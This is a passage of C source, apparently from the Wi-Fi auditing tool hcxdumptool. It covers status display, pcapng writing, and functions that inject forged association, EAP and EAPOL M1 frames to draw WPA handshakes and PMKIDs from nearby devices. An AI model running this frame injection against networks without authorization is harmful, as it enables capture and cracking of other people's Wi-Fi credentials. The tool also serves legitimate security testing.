0;\nfprintf(stdout, \"%s\", rtb);\nif(rdsort > 0) qsort(aplist, RCAD_MAX, APLIST_SIZE, sort_aplist_by_tsakt);\nreturn;\n}\n/*---------------------------------------------------------------------------*/\n#ifdef HCXSTATUSOUT\nstatic inline void show_realtime(void)\n{\nstatic size_t i;\nstatic size_t p;\nstatic size_t pa;\nstatic time_t tvlast;\nstatic char *pmdef = \" \";\nstatic char *pmok = \"+\";\nstatic char *ps;\nstatic char *mc;\nstatic char *ma;\nstatic char *me;\nstatic char *ak;\nstatic char *ar;\n\nif(system(\"clear\") != 0) errorcount++;\nif(rdsort == 0)\n\t{\n\tqsort(aplist, APLIST_MAX, APLIST_SIZE, sort_aplist_by_tsakt);\n\tsprintf(&rtb[0], \" CHA   LAST   R 1 3 P S    MAC-AP    ESSID (last seen on top)     SCAN-FREQUENCY: %6u\\n\"\n\t\t\t \"-----------------------------------------------------------------------------------------\\n\", (scanlist + scanlistindex)->frequency);\n\t}\nelse\n\t{\n\tqsort(aplist, APLIST_MAX, APLIST_SIZE, sort_aplist_by_status);\n\tsprintf(&rtb[0], \" CHA   LAST   R 1 3 P S    MAC-AP    ESSID (last EAPOL on top)    SCAN-FREQUENCY: %6u\\n\"\n\t\t\t \"-----------------------------------------------------------------------------------------\\n\", (scanlist + scanlistindex)->frequency);\n\t}\np = strlen(rtb);\ni = 0;\npa = 0;\nfor(i = 0; i < 20 ; i++)\n\t{\n\tif((aplist +i)->tsakt == 0) break;\n\tif(((aplist +i)->status & AP_EAPOL_M1) == AP_EAPOL_M1) mc = pmok;\n\telse mc = pmdef;\n\tif(((aplist +i)->status & AP_EAPOL_M3) == AP_EAPOL_M3) ma = pmok;\n\telse ma = pmdef;\n\tif(((aplist +i)->status & AP_PMKID) == AP_PMKID) ps = pmok;\n\telse ps = pmdef;\n\tif(((aplist +i)->ie.flags & APAKM_MASK) != 0) ak = pmok;\n\telse ak = pmdef;\n\tif(((aplist +i)->status & AP_IN_RANGE) == AP_IN_RANGE) ar = pmok;\n\telse ar = pmdef;\n\ttvlast = (aplist +i)->tsakt / 1000000000ULL;\n\tstrftime(timestring1, TIMESTRING_LEN, \"%H:%M:%S\", localtime(&tvlast));\n\tsprintf(&rtb[p], \" %3d %s %s %s %s %s %s %02x%02x%02x%02x%02x%02x %.*s\\n\",\n\t\t\t(aplist +i)->ie.channel, timestring1, ar, mc, ma, ps, ak,\n\t\t\t(aplist +i)->macap[0], (aplist +i)->macap[1], (aplist +i)->macap[2], (aplist +i)->macap[3], (aplist +i)->macap[4], (aplist +i)->macap[5],\n\t\t\t(aplist +i)->ie.essidlen, (aplist +i)->ie.essid);\n\tif(tsakt - (aplist +i)->tsakt > AP_IN_RANGE_TOT) (aplist +i)->status = ((aplist +i)->status & AP_IN_RANGE_MASK);\n\tp = strlen(rtb);\n\tpa++;\n\t}\nfor(i = 0; i < (22 - pa); i++) rtb[p++] = '\\n';\nif(rdsort == 0)\n\t{\n\tqsort(clientlist, CLIENTLIST_MAX, CLIENTLIST_SIZE, sort_clientlist_by_tsakt);\n\tsprintf(&rtb[p], \"   LAST   E 2 MAC-AP-ROGUE   MAC-CLIENT   ESSID (last seen on top)\\n\"\n\t\t\t \"-----------------------------------------------------------------------------------------\\n\");\n\t}\nelse\n\t{\n\tqsort(clientlist, CLIENTLIST_MAX, CLIENTLIST_SIZE, sort_clientlist_by_status);\n\tsprintf(&rtb[p], \"   LAST   E 2 MAC-AP-ROGUE   MAC-CLIENT   ESSID (last M2ROGUE on top)\\n\"\n\t\t\t \"-----------------------------------------------------------------------------------------\\n\");\n\t}\np = strlen(rtb);\nfor(i = 0; i < 20; i++)\n\t{\n\tif((clientlist +i)->tsakt == 0) break;\n\tif(((clientlist +i)->status & CLIENT_EAP_START) == CLIENT_EAP_START) me = pmok;\n\telse me = pmdef;\n\tif(((clientlist +i)->status & CLIENT_EAPOL_M2) == CLIENT_EAPOL_M2) mc = pmok;\n\telse mc = pmdef;\n\ttvlast = (clientlist +i)->tsakt / 1000000000ULL;\n\tstrftime(timestring1, TIMESTRING_LEN, \"%H:%M:%S\", localtime(&tvlast));\n\tsprintf(&rtb[p], \" %s %s %s %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x %.*s\\n\",\n\t\t\ttimestring1, me, mc,\n\t\t\t(clientlist +i)->macap[0], (clientlist +i)->macap[1], (clientlist +i)->macap[2], (clientlist +i)->macap[3], (clientlist +i)->macap[4], (clientlist +i)->macap[5],\n\t\t\t(clientlist +i)->macclient[0], (clientlist +i)->macclient[1], (clientlist +i)->macclient[2], (clientlist +i)->macclient[3], (clientlist +i)->macclient[4], (clientlist +i)->macclient[5],\n\t\t\t(clientlist +i)->ie.essidlen, (clientlist +i)->ie.essid);\n\tp = strlen(rtb);\n\t}\nrtb[p] = 0;\nfprintf(stdout, \"%s\", rtb);\nif(rdsort > 0)\n\t{\n\tqsort(aplist, APLIST_MAX, APLIST_SIZE, sort_aplist_by_tsakt);\n\tqsort(clientlist, CLIENTLIST_MAX, CLIENTLIST_SIZE, sort_clientlist_by_tsakt);\n\t}\nreturn;\n}\n#endif\n/*===========================================================================*/\n/* frequency handling */\n/*---------------------------------------------------------------------------*/\nstatic u32 channel_to_frequency(u16 channel, u16 band)\n{\nif(channel <= 0) return 0;\nswitch(band)\n\t{\n\tcase NL80211_BAND_2GHZ:\n\tif(channel == 14) return 2484;\n\telse if (channel < 14) return 2407 + (channel * 5);\n\tbreak;\n\n\tcase NL80211_BAND_5GHZ:\n\tif(channel >= 182 && channel <= 196) return 4000 + (channel * 5);\n\telse return 5000 + channel * 5;\n\tbreak;\n\n\t#if(LINUX_VERSION_CODE >= KERNEL_VERSION(5, 10, 0))\n\tcase NL80211_BAND_6GHZ:\n\tif(channel == 2) return 5935;\n\tif(channel <= 233) return 5950 + (channel * 5);\n\tbreak;\n\n\tcase NL80211_BAND_60GHZ:\n\tif(channel < 7) return 56160 + (channel * 2160);\n\tbreak;\n\n\tcase NL80211_BAND_S1GHZ:\n\treturn 902000 + (channel * 500);\n\t#endif\n\t}\nreturn 0;\n}\n/*---------------------------------------------------------------------------*/\nstatic u16 frequency_to_channel(u32 frequency)\n{\nif(frequency == 2484) return 14;\nelse if(frequency < 2484) return (frequency - 2407) / 5;\nelse if(frequency >= 4910 && frequency <= 4980) return (frequency - 4000) / 5;\nelse if(frequency < 5925) return (frequency - 5000) / 5;\nelse if(frequency == 5935) return 2;\nelse if(frequency <= 45000) return (frequency - 5950) / 5;\nelse if(frequency >= 58320 && frequency <= 70200) return (frequency - 56160) / 2160;\nelse return 0;\n}\n/*===========================================================================*/\n#ifdef HCXNMEAOUT\nstatic void writegpwpl(size_t i)\n{\nstatic ssize_t p1;\nstatic ssize_t p2;\nstatic size_t c;\nstatic u8 cs;\n\nif(gprmclen == 0) return;\nif(write(fd_hcxpos, gprmc, gprmclen) != gprmclen) errorcount++;\nif(gpggalen != 0)\n\t{\n\tif(write(fd_hcxpos, gpgga, gpggalen) != gpggalen) errorcount++;\n\t}\np1 = 0;\np2 = 6;\nc = 0;\ncs = 0x5c;\nwhile((p1 < gprmclen) && (c < 7))\n\t{\n\tif(gprmc[p1] == ',') c++;\n\tif(c > 2)\n\t\t{\n\t\tgpwpl[p2] = gprmc[p1];\n\t\tcs ^= gpwpl[p2++];\n\t\t}\n\tp1++;\n\t}\nfor (p1 = 0; p1 < ETH_ALEN; ++p1)\n\t{\n\tgpwpl[p2] = lookuptable[((aplist +i)->macap[p1] & 0xf0) >> 4];\n\tcs ^= gpwpl[p2++];\n\tgpwpl[p2] = lookuptable[(aplist +i)->macap[p1] & 0xf];\n\tcs ^= gpwpl[p2++];\n\t}\ngpwpl[p2++] = '*';\ngpwpl[p2++] = lookuptable[(cs & 0xf0) >> 4];\ngpwpl[p2++] = lookuptable[cs & 0x0f];\ngpwpl[p2++] = '\\r';\ngpwpl[p2++] = '\\n';\nif(write(fd_hcxpos, gpwpl, p2) != p2) errorcount++;\ngpwpl[p2++] = '\\0';\nif(((aplist +i)->ie.essidlen == 0) || ((aplist +i)->ie.essidlen > ESSID_MAX)) return;\np2 = 7;\ncs = 0x63;\nfor(p1 = 0; p1 < (aplist +i)->ie.essidlen; p1 ++)\n\t{\n\tgptxt[p2] = lookuptable[((aplist +i)->ie.essid[p1] & 0xf0) >> 4];\n\tcs ^= gptxt[p2++];\n\tgptxt[p2] = lookuptable[(aplist +i)->ie.essid[p1] & 0xf];\n\tcs ^= gptxt[p2++];\n\t}\ngptxt[p2++] = '*';\ngptxt[p2++] = lookuptable[(cs & 0xf0) >> 4];\ngptxt[p2++] = lookuptable[cs & 0x0f];\ngptxt[p2++] = '\\r';\ngptxt[p2++] = '\\n';\nif(write(fd_hcxpos, gptxt, p2) != p2) errorcount++;\ngptxt[p2++] = '\\0';\nwgpwplcount++;\nreturn;\n}\n#endif\n/*===========================================================================*/\nstatic u16 addoption(u8 *posopt, u16 optioncode, u16 optionlen, char *option)\n{\nstatic u16 padding;\nstatic option_header_t *optionhdr;\n\noptionhdr = (option_header_t*)posopt;\noptionhdr->option_code = optioncode;\noptionhdr->option_length = optionlen;\npadding = (4 -(optionlen % 4)) % 4;\nmemset(optionhdr->option_data, 0, optionlen +padding);\nmemcpy(optionhdr->option_data, option, optionlen);\nreturn optionlen + padding + 4;\n}\n/*---------------------------------------------------------------------------*/\n/*\nstatic u16 addcustomoptionheader(u8 *pospt)\n{\nstatic u16 colen;\nstatic option_header_t *optionhdr;\n\noptionhdr = (option_header_t*)pospt;\noptionhdr->option_code = SHB_CUSTOM_OPT;\ncolen = OH_SIZE;\nmemcpy(pospt +colen, &hcxmagic, 4);\ncolen += 4;\nmemcpy(pospt +colen, &hcxmagic, 32);\ncolen += 32;\nreturn colen;\n}\n*/\n/*===========================================================================*/\nstatic u16 addcustomoption(u8 *pospt)\n{\nstatic u16 colen;\nstatic option_header_t *optionhdr;\nstatic optionfield64_t *of;\n\noptionhdr = (option_header_t*)pospt;\noptionhdr->option_code = SHB_CUSTOM_OPT;\ncolen = OH_SIZE;\nmemcpy(pospt +colen, &hcxmagic, 4);\ncolen += 4;\nmemcpy(pospt +colen, &hcxmagic, 32);\ncolen += 32;\ncolen += addoption(pospt +colen, OPTIONCODE_MACAP, 6, (char*)macaprg);\nof = (optionfield64_t*)(pospt +colen);\nof->option_code = OPTIONCODE_RC;\nof->option_length = 8;\nof->option_value = replaycountrg;\ncolen += 12;\ncolen += addoption(pospt +colen, OPTIONCODE_ANONCE, 32, (char*)anoncerg);\ncolen += addoption(pospt +colen, OPTIONCODE_MACCLIENT, 6, (char*)macclientrg);\ncolen += addoption(pospt +colen, OPTIONCODE_SNONCE, 32, (char*)snoncerg);\ncolen += addoption(pospt +colen, OPTIONCODE_WEAKCANDIDATE, strnlen(weakcandidate, PSK_MAX), weakcandidate);\ncolen += addoption(pospt +colen, 0, 0, NULL);\noptionhdr->option_length = colen -OH_SIZE;\nreturn colen;\n}\n/*===========================================================================*/\nstatic inline void writeepbm1(void)\n{\nstatic ssize_t epblen;\nstatic ssize_t ii;\nstatic u64 tsm1;\nstatic u16 padding;\nstatic total_length_t *totallength;\n\nii = RTHTX_SIZE + EPB_SIZE;\nmacftx = (ieee80211_mac_t*)&epbown[ii];\nmacftx->type = IEEE80211_FTYPE_DATA;\nmacftx->subtype = IEEE80211_STYPE_DATA;\nmacftx->from_ds = 1;\nmacftx->duration = HCXTXDURATION;\nmemcpy(macftx->addr1, macfrx->addr2, ETH_ALEN);\nmemcpy(macftx->addr2, macfrx->addr1, ETH_ALEN);\nmemcpy(macftx->addr3, macfrx->addr3, ETH_ALEN);\nmacftx->sequence = __hcx16le(seqcounter3++ << 4);\nif(seqcounter1 > 4095) seqcounter3 = 1;\nii += MAC_SIZE_NORM;\nmemcpy(&epbown[ii], &eapolm1data, EAPOLM1DATA_SIZE);\nii += EAPOLM1DATA_SIZE;\nepbhdr = (enhanced_packet_block_t*)epbown;\nepblen = EPB_SIZE;\nepbhdr->block_type = EPBID;\nepbhdr->interface_id = 0;\nepbhdr->cap_len = ii;\nepbhdr->org_len = ii;\ntsm1 = tsakt - 1;\nepbhdr->timestamp_high = tsm1 >> 32;\nepbhdr->timestamp_low = (u32)tsm1 & 0xffffffff;\npadding = (4 -(epbhdr->cap_len % 4)) % 4;\nepblen += ii;\nmemset(&epbown[epblen], 0, padding);\nepblen += padding;\nepblen += addoption(epbown +epblen, SHB_EOC, 0, NULL);\ntotallength = (total_length_t*)(epbown +epblen);\nepblen += TOTAL_SIZE;\nepbhdr->total_length = epblen;\ntotallength->total_length = epblen;\nif(write(fd_pcapng, &epbown, epblen) != epblen) errorcount++;\n#ifdef HCXSTATUSOUT\nwepbcount++;\n#endif\nreturn;\n}\n/*===========================================================================*/\nstatic inline void writeepb(void)\n{\nstatic ssize_t epblen;\nstatic u16 padding;\nstatic total_length_t *totallength;\n\nepbhdr = (enhanced_packet_block_t*)epb;\nepblen = EPB_SIZE;\nepbhdr->block_type = EPBID;\nepbhdr->interface_id = 0;\nepbhdr->cap_len = packetlen;\nepbhdr->org_len = packetlen;\nepbhdr->timestamp_high = tsakt >> 32;\nepbhdr->timestamp_low = (u32)tsakt & 0xffffffff;\npadding = (4 -(epbhdr->cap_len % 4)) % 4;\nepblen += packetlen;\nmemset(&epb[epblen], 0, padding);\nepblen += padding;\nepblen += addoption(epb +epblen, SHB_EOC, 0, NULL);\ntotallength = (total_length_t*)(epb +epblen);\nepblen += TOTAL_SIZE;\nepbhdr->total_length = epblen;\ntotallength->total_length = epblen;\nif(write(fd_pcapng, &epb, epblen) != epblen) errorcount++;\n#ifdef HCXSTATUSOUT\nwepbcount++;\n#endif\nreturn;\t\n}\n/*---------------------------------------------------------------------------*/\nstatic bool writeshb(void)\n{\nstatic ssize_t shblen;\nstatic section_header_block_t *shbhdr;\nstatic total_length_t *totallength;\nstatic struct utsname unameData;\nstatic char sysinfo[SHB_SYSINFO_LEN];\nstatic u8 shb[PCAPNG_BLOCK_SIZE];\n\nmemset(&shb, 0, PCAPNG_BLOCK_SIZE);\nshblen = SHB_SIZE;\nshbhdr = (section_header_block_t*)shb;\nshbhdr->block_type = PCAPNGBLOCKTYPE;\nshbhdr->byte_order_magic = PCAPNGMAGICNUMBER;\nshbhdr->major_version = PCAPNG_MAJOR_VER;\nshbhdr->minor_version = PCAPNG_MINOR_VER;\nshbhdr->section_length = -1;\nif(uname(&unameData) == 0)\n\t{\n\tshblen += addoption(shb +shblen, SHB_HARDWARE, strlen(unameData.machine), unameData.machine);\n\tsnprintf(sysinfo, SHB_SYSINFO_LEN, \"%s %s\", unameData.sysname, unameData.release);\n\tshblen += addoption(shb +shblen, SHB_OS, strlen(sysinfo), sysinfo);\n\tsnprintf(sysinfo, SHB_SYSINFO_LEN, \"hcxdumptool %s\", VERSION_TAG);\n\tshblen += addoption(shb +shblen, SHB_USER_APPL, strlen(sysinfo), sysinfo);\n\t}\nshblen += addcustomoption(shb +shblen);\nshblen += addoption(shb +shblen, SHB_EOC, 0, NULL);\ntotallength = (total_length_t*)(shb +shblen);\nshblen += TOTAL_SIZE;\nshbhdr->total_length = shblen;\ntotallength->total_length = shblen;\nif(write(fd_pcapng, &shb, shblen) != shblen) return false;\n#ifdef HCXSTATUSOUT\nwshbcount++;\n#endif\nreturn true;\n}\n/*---------------------------------------------------------------------------*/\nstatic bool writeidb(void)\n{\nstatic ssize_t idblen;\nstatic interface_description_block_t *idbhdr;\nstatic total_length_t *totallength;\nstatic char tr[1];\nstatic u8 idb[PCAPNG_BLOCK_SIZE];\n\nmemset(&idb, 0, PCAPNG_BLOCK_SIZE);\nidblen = IDB_SIZE;\nidbhdr = (interface_description_block_t*)idb;\nidbhdr->block_type = IDBID;\nidbhdr->linktype = DLT_IEEE802_11_RADIO;\nidbhdr->reserved = 0;\nidbhdr->snaplen = PCAPNG_SNAPLEN;\nidblen += addoption(idb +idblen, IF_NAME, strnlen(ifaktname, IF_NAMESIZE), ifaktname);\nidblen += addoption(idb +idblen, IF_MACADDR, 6, (char*)ifakthwmac);\ntr[0] = TSRESOL_NSEC;\nidblen += addoption(idb +idblen, IF_TSRESOL, 1, tr);\nidblen += addoption(idb +idblen, SHB_EOC, 0, NULL);\ntotallength = (total_length_t*)(idb +idblen);\nidblen += TOTAL_SIZE;\nidbhdr->total_length = idblen;\ntotallength->total_length = idblen;\nif(write(fd_pcapng, &idb, idblen) != idblen) return false;\n#ifdef HCXSTATUSOUT\nwidbcount++;\n#endif\nreturn true;\n}\n/*---------------------------------------------------------------------------*/\nstatic bool writecb(void)\n{\nstatic ssize_t cblen;\nstatic custom_block_t *cbhdr;\nstatic optionfield64_t *of;\nstatic total_length_t *totallength;\nstatic u8 cb[PCAPNG_BLOCK_SIZE];\n\nmemset(&cb, 0, PCAPNG_BLOCK_SIZE);\ncbhdr = (custom_block_t*)cb;\ncblen = CB_SIZE;\ncbhdr->block_type = CBID;\ncbhdr->total_length = CB_SIZE;\nmemcpy(cbhdr->pen, &hcxmagic, 4);\nmemcpy(cbhdr->hcxm, &hcxmagic, 32);\ncblen += addoption(cb +cblen, OPTIONCODE_MACAP, 6, (char*)macaprg);\nof = (optionfield64_t*)(cb +cblen);\nof->option_code = OPTIONCODE_RC;\nof->option_length = 8;\nof->option_value = replaycountrg;\ncblen += 12;\ncblen += addoption(cb +cblen, OPTIONCODE_ANONCE, 32, (char*)anoncerg);\ncblen += addoption(cb +cblen, OPTIONCODE_MACCLIENT, 6, (char*)macclientrg);\ncblen += addoption(cb +cblen, OPTIONCODE_SNONCE, 32, (char*)snoncerg);\ncblen += addoption(cb +cblen, OPTIONCODE_WEAKCANDIDATE, strnlen(weakcandidate, PSK_MAX), weakcandidate);\ncblen += addoption(cb +cblen, 0, 0, NULL);\ntotallength = (total_length_t*)(cb +cblen);\ncblen += TOTAL_SIZE;\ncbhdr->total_length = cblen;\ntotallength->total_length = cblen;\nif(write(fd_pcapng, &cb, cblen) != cblen) return false;\n#ifdef HCXSTATUSOUT\nwecbcount++;\n#endif\nreturn true;\n}\n/*---------------------------------------------------------------------------*/\n#ifdef HCXNMEAOUT\nstatic bool writecbnmea(void)\n{\nstatic ssize_t cblen;\nstatic custom_block_t *cbhdr;\nstatic total_length_t *totallength;\nstatic u8 cb[PCAPNG_BLOCK_SIZE];\n\nmemset(&cb, 0, PCAPNG_BLOCK_SIZE);\ncbhdr = (custom_block_t*)cb;\ncblen = CB_SIZE;\ncbhdr->block_type = CBID;\ncbhdr->total_length = CB_SIZE;\nmemcpy(cbhdr->pen, &hcxmagic, 4);\nmemcpy(cbhdr->hcxm, &hcxmagic, 32);\nif(gprmclen > 2) cblen += addoption(cb +cblen, OPTIONCODE_NMEA, gprmclen - 2, gprmc);\nif(gpggalen > 2) cblen += addoption(cb +cblen, OPTIONCODE_NMEA, gpggalen - 2, gpgga);\ncblen += addoption(cb +cblen, 0, 0, NULL);\ntotallength = (total_length_t*)(cb +cblen);\ncblen += TOTAL_SIZE;\ncbhdr->total_length = cblen;\ntotallength->total_length = cblen;\nif(write(fd_pcapng, &cb, cblen) != cblen) return false;\n#ifdef HCXNMEAOUT\nwecbnmeacount++;\n#endif\nreturn true;\n}\n#endif\n/*---------------------------------------------------------------------------*/\nstatic bool open_pcapng(char *pcapngoutname)\n{\nstatic int c;\nstatic struct stat statinfo;\nstatic char *pcapngfilename = NULL;\nstatic char pcapngname[PATH_MAX];\n\nif(pcapngoutname == NULL)\n\t{\n\tc = 0;\n\tsnprintf(pcapngname, PATH_MAX, \"%s-%s.pcapng\", timestring1, ifaktname);\n\twhile(stat(pcapngname, &statinfo) == 0)\n\t\t{\n\t\tsnprintf(pcapngname, PATH_MAX, \"%s-%s-%02d.pcapng\", timestring1, ifaktname, c);\n\t\tc++;\n\t\t}\n\tpcapngfilename = pcapngname;\n\t}\nelse pcapngfilename = pcapngoutname;\numask(0);\nif((fd_pcapng = open(pcapngfilename, O_WRONLY | O_TRUNC | O_CREAT, 0777)) < 0) return false;\nif(writeshb() == false) return false;\nif(writeidb() == false) return false;\nif(writecb() == false) return false;\nreturn true;\n}\n/*===========================================================================*/\n/*===========================================================================*/\n/* TX 802.11 */\n/*===========================================================================*/\nstatic inline __attribute__((always_inline)) void send_80211_associationrequest_org(size_t i)\n{\nssize_t ii;\n\nii = RTHTX_SIZE;\nmacftx = (ieee80211_mac_t*)&wltxbuffer[ii];\nmacftx->type = IEEE80211_FTYPE_MGMT;\nmacftx->subtype = IEEE80211_STYPE_ASSOC_REQ;\nwltxbuffer[ii + 1] = 0;\nmacftx->duration = HCXTXDURATION;\nmemcpy(macftx->addr1, macfrx->addr2, ETH_ALEN);\nmemcpy(macftx->addr2, (aplist +i)->macclient, ETH_ALEN);\nmemcpy(macftx->addr3, macfrx->addr3, ETH_ALEN);\nmacftx->sequence = __hcx16le(seqcounter2++ << 4);\nif(seqcounter1 > 4095) seqcounter2 = 1;\nii += MAC_SIZE_NORM;\nmemcpy(&wltxbuffer[ii], &associationrequestcapa, ASSOCIATIONREQUESTCAPA_SIZE);\nii += ASSOCIATIONREQUESTCAPA_SIZE;\nwltxbuffer[ii ++] = 0;\nwltxbuffer[ii ++] = (aplist +i)->ie.essidlen;\nmemcpy(&wltxbuffer[ii], (aplist +i)->ie.essid, (aplist +i)->ie.essidlen);\nii += (aplist +i)->ie.essidlen;\nmemcpy(&wltxbuffer[ii], &associationrequestdata, ASSOCIATIONREQUEST_SIZE);\nif(((aplist +i)->ie.flags & APGS_CCMP) == APGS_CCMP) wltxbuffer[ii +0x17] = RSN_CS_CCMP;\nelse if(((aplist +i)->ie.flags & APGS_TKIP) == APGS_TKIP) wltxbuffer[ii +0x17] = RSN_CS_TKIP;\nif(((aplist +i)->ie.flags & APCS_CCMP) == APCS_CCMP) wltxbuffer[ii +0x1d] = RSN_CS_CCMP;\nelse if(((aplist +i)->ie.flags & APCS_TKIP) == APCS_TKIP) wltxbuffer[ii +0x1d] = RSN_CS_TKIP;\nii += ASSOCIATIONREQUEST_SIZE;\nif((write(fd_socket_tx, &wltxbuffer, ii)) == ii)\n\t{\n\terrortxcount = 0;\n\treturn;\n\t}\n#ifdef HCXDEBUG\nfprintf(fh_debug, \"write associationrequest_org failed: %s\\n\", strerror(errno));\n#endif\nerrortxcount++;\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void send_80211_associationrequest(size_t i)\n{\nssize_t ii;\n\nii = RTHTX_SIZE;\nmacftx = (ieee80211_mac_t*)&wltxbuffer[ii];\nmacftx->type = IEEE80211_FTYPE_MGMT;\nmacftx->subtype = IEEE80211_STYPE_ASSOC_REQ;\nwltxbuffer[ii + 1] = 0;\nmacftx->duration = HCXTXDURATION;\nmemcpy(macftx->addr1, macfrx->addr2, ETH_ALEN);\nmemcpy(macftx->addr2, macclientrg, ETH_ALEN);\nmemcpy(macftx->addr3, macfrx->addr3, ETH_ALEN);\nmacftx->sequence = __hcx16le(seqcounter2++ << 4);\nif(seqcounter1 > 4095) seqcounter2 = 1;\nii += MAC_SIZE_NORM;\nmemcpy(&wltxbuffer[ii], &associationrequestcapa, ASSOCIATIONREQUESTCAPA_SIZE);\nii += ASSOCIATIONREQUESTCAPA_SIZE;\nwltxbuffer[ii ++] = 0;\nwltxbuffer[ii ++] = (aplist +i)->ie.essidlen;\nmemcpy(&wltxbuffer[ii], (aplist +i)->ie.essid, (aplist +i)->ie.essidlen);\nii += (aplist +i)->ie.essidlen;\nmemcpy(&wltxbuffer[ii], &associationrequestdata, ASSOCIATIONREQUEST_SIZE);\nif(((aplist +i)->ie.flags & APGS_CCMP) == APGS_CCMP) wltxbuffer[ii +0x17] = RSN_CS_CCMP;\nelse if(((aplist +i)->ie.flags & APGS_TKIP) == APGS_TKIP) wltxbuffer[ii +0x17] = RSN_CS_TKIP;\nif(((aplist +i)->ie.flags & APCS_CCMP) == APCS_CCMP) wltxbuffer[ii +0x1d] = RSN_CS_CCMP;\nelse if(((aplist +i)->ie.flags & APCS_TKIP) == APCS_TKIP) wltxbuffer[ii +0x1d] = RSN_CS_TKIP;\nii += ASSOCIATIONREQUEST_SIZE;\nif((write(fd_socket_tx, &wltxbuffer, ii)) == ii)\n\t{\n\terrortxcount = 0;\n\treturn;\n\t}\n#ifdef HCXDEBUG\nfprintf(fh_debug, \"write associationrequest failed: %s\\n\", strerror(errno));\n#endif\nerrortxcount++;\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void send_80211_eap_request_id(void)\n{\nstatic ssize_t ii;\n\nii = RTHTX_SIZE;\nmacftx = (ieee80211_mac_t*)&wltxbuffer[ii];\nmacftx->type = IEEE80211_FTYPE_DATA;\nmacftx->subtype = IEEE80211_STYPE_DATA;\nwltxbuffer[ii + 1] = 0;\nmacftx->from_ds = 1;\nmacftx->duration = HCXTXDURATION;\nmemcpy(macftx->addr1, macfrx->addr2, ETH_ALEN);\nmemcpy(macftx->addr2, macfrx->addr1, ETH_ALEN);\nmemcpy(macftx->addr3, macfrx->addr3, ETH_ALEN);\nmacftx->sequence = 0;\nii += MAC_SIZE_NORM;\nmemcpy(&wltxbuffer[ii], &eaprequestiddata, EAPREQUESTID_SIZE);\nii += EAPREQUESTID_SIZE;\nif(write(fd_socket_tx, &wltxbuffer, ii) == ii)\t{\n\terrortxcount = 0;\n\treturn;\n\t}\n#ifdef HCXDEBUG\nfprintf(fh_debug, \"send_80211_eap_request_id failed: %s\\n\", strerror(errno));\n#endif\nerrortxcount++;\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void send_80211_eapol_m1(void)\n{\nstatic ssize_t ii;\n\nii = RTHTX_SIZE;\nmacftx = (ieee80211_mac_t*)&wltxbuffer[ii];\nmacftx->type = IEEE80211_FTYPE_DATA;\nmacftx->subtype = IEEE80211_STYPE_DATA;\nwltxbuffer[ii + 1] = 0;\nmacftx->from_ds = 1;\nmacftx->duration = HCXTXDURATION;\nmemcpy(macftx->addr1, macfrx->addr2, ETH_ALEN);\nmemcpy(macftx->addr2, macfrx->addr1, ETH_ALEN);\nmemcpy(macftx->addr3, macfrx->addr3, ETH_ALEN);\nmacftx->sequence = 0;\nii += MAC_SIZE_NORM;\nmemcpy(&wltxbuffer[ii], &eapolm1data, EAPOLM1DATA_SIZE);\nii += EAPOLM1DATA_SIZE;\nif(write(fd_socket_tx, &wltxbuffer, ii) == ii)\t{\n\terrortxcount = 0;\n\treturn;\n\t}\n#ifdef HCXDEBUG\nfprintf(fh_debug, \"send_80211_eapol_m1 failed: %s\\n\", strerror(errno));\n#endif\nerrortxcount++;\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void send_80211_reassociationresponse(u16 aid)\n{\nstatic ssize_t ii;\nstatic ieee80211_assoc_or_reassoc_resp_t *associationresponsetx;\n\nii = RTHTX_SIZE;\nmacftx = (ieee80211_mac_t*)&wltxbuffer[ii];\nmacftx->type = IEEE80211_FTYPE_MGMT;\nmacftx->subtype = IEEE80211_STYPE_REASSOC_RESP;\nwltxbuffer[ii + 1] = 0;\nmacftx->duration = HCXTXDURATION;\nmemcpy(macftx->addr1, macfrx->addr2, ETH_ALEN);\nmemcpy(macftx->addr2, macfrx->addr1, ETH_ALEN);\nmemcpy(macftx->addr3, macfrx->addr3, ETH_ALEN);\nmacftx->sequence = __hcx16le(seqcounter3++ << 4);\nif(seqcounter1 > 4095) seqcounter3 = 1;\nii += MAC_SIZE_NORM;\nassociationresponsetx = (ieee80211_assoc_or_reassoc_resp_t*)&wltxbuffer[ii];\nassociationresponsetx->capability = HCXTXCAPABILITY;\nassociationresponsetx->status = 0;\nassociationresponsetx->aid = aid;\nii += IEEE80211_ASSOCIATIONRESPONSE_SIZE;\nmemcpy(&wltxbuffer[ii], &associationresponsedata, ASSOCIATIONRESPONSEDATA_SIZE);\nii += ASSOCIATIONRESPONSEDATA_SIZE;\nif(write(fd_socket_tx, &wltxbuffer, ii) == ii)\n\t{\n\terrortxcount = 0;\n\treturn;\n\t}\n#ifdef HCXDEBUG\nfprintf(fh_debug, \"send_80211_reassociationresponse failed: %s\\n\", strerror(errno));\n#endif\nerrortxcount++;\nreturn;\n}\n/*---------------------------------------------------------------------------*/\nstatic inline __attribute__((always_inline)) void send_80211_associationresponse(void)\n{\nstatic ssize_t ii;\nstatic ieee80211_assoc_or_reassoc_resp_t *associationresponsetx;\n\nii = RTHTX_SIZE;\nmacftx = (ieee80211_mac_t*)&wltxbuffer[ii];\nmacftx->type = IEEE80211_FTYPE_MGMT;\nmacftx->subtype = IEEE80211_STYPE_ASSOC_RESP;\nwltxbuffer[ii + 1] = 0;\nmacftx->duration = HCXTXDURATION;\nmemcpy(macftx->addr1, macfrx->addr2, ETH_ALEN);\nmemcpy(macftx->addr2, macfrx->addr1, ETH_ALEN);\nmemcpy(macftx->addr3, macfrx->addr3, ETH_ALEN);\nmacftx->sequence = __hcx16le(seqcounter3++ << 4);\nif(seqcounter1 > 4095) seqcounter3 = 1;\nii += MAC_SIZE_NORM;\nassociationresponsetx = (ieee80211_assoc_or_reassoc_resp_t*)&wltxbuffer[ii];\nassociationresponsetx->capability = HCXTXCAPABILITY;\nassociationresponsetx->status = 0;\nassociationresponsetx->aid = HCXTXAID;\nii += IEEE80211_ASSOCIATIONRESPONSE_SIZE;\nmemcpy(&wltxbuffer[ii], &associationresponsedata, ASSOCIATIONRESPONSEDATA_SIZE);\nii += ASSOCIATIONRESPONSEDATA_SIZE;\nif(write(fd_socket_tx, &wltxbuffer, ii) == ii)\n\t{\n\terrortxcount = 0;\n\treturn;\n\t}\n#ifdef 